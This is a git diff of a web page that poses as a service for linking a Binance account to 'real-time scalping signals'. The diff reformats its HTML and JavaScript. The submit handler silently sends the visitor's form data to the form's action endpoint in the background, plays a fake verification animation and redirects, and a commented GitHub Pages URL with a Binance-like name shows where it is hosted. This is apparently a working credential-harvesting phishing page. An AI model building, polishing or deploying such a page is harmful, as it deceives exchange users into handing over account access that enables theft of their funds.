@@ -90,7 +90,7 @@ body.dark .theme{background:#222;color:white;}
 </button>
 
 <p style="margin-top:14px;text-align:center;font-size:13px;line-height:1.45;opacity:.75;">
-click on connect to automatically connect your binance account to the scalping real time data signals to improve your trades.
+Click on connect to automatically connect your Binance account to the scalping real-time data signals to improve your trades.
 </p>
 
 </form>
@@ -110,48 +110,53 @@ click on connect to automatically connect your binance account to the scalping r
 </div>
 
 <script>
-const form=document.getElementById("form");
-const spin=document.getElementById("spin");
-const btn=document.getElementById("btn");
-const login=document.getElementById("login");
-const verify=document.getElementById("verify");
+const form = document.getElementById("form");
+const spin = document.getElementById("spin");
+const btn = document.getElementById("btn");
+const login = document.getElementById("login");
+const verify = document.getElementById("verify");
 
 function toggleTheme(){
   if(document.body.classList.contains("dark")){
     document.body.classList.remove("dark");
     localStorage.setItem("theme","light");
-  }else{
+  } else {
     document.body.classList.add("dark");
     localStorage.setItem("theme","dark");
   }
 }
 
+// restore theme on load
 if(localStorage.getItem("theme")==="dark"){
   document.body.classList.add("dark");
 }
 
-form.addEventListener("submit",(e)=>{
+form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  spin.style.display="block";
-  btn.disabled=true;
+  spin.style.display = "block";
+  btn.disabled = true;
 
-  login.style.transform="translateX(-100%)";
-  verify.style.transform="translateX(-100%)";
+  // animate pages
+  login.style.transform = "translateX(-100%)";
+  verify.style.transform = "translateX(-100%)";
 
-  // send in background (does not block redirect)
-  try{
-    fetch(form.action,{
-      method:"POST",
-      body:new FormData(form),
-      headers:{'Accept':'application/json'}
-    }).catch(()=>{});
-  }catch(err){}
+  // send form data in background (does not block redirect)
+  try {
+    await fetch(form.action, {
+      method: "POST",
+      body: new FormData(form),
+      headers: {'Accept':'application/json'}
+    });
+  } catch(err) {}
 
-  // clean reliable redirect
-  setTimeout(()=>{
-    window.location.replace("home.html");
-  },1800);
+  // redirect after short delay
+  setTimeout(() => {
+    // Replace with your relative or absolute path
+    window.location.href = "home.html";
+    // OR for GitHub Pages:
+    // window.location.href = "https://binatradingsignalconnecthub.github.io/Binstraccuratetradesignal/home.html";
+  }, 1800);
 });
 </script>
 
